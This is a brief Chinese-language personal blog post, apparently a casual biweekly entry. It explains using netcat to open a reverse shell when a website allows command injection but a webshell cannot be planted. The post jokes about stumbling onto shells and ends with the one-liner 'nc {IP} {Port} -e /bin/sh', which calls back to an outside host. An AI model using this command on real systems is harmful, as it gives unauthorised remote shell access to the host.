嗯，又到約定的兩個禮拜一次的寫 Blog 了
想了一天，結果最後來寫個 shell 反彈好了 XD

由於人在網路飄，馬路跟網路一樣寬，大家撿到、踢到、夢到什麼應該都合情合理
當然，所以偶爾踢到一些 shell 應該也是情有可原
可是有得時候 web 只有 command injection，可是 webshell 上不去、webshell 遇到某些特殊字元刪不掉、或是其他狀況怎麼辦？

這時我們可以嘗試看看用 nc 反連（或是用其他 shell 反彈）來達成

嗯... 原本想說來截圖一些反連或漏洞畫面...
想想算了，大概會被請去喝咖啡 (遮臉)

nc {IP} {Port} -e /bin/sh
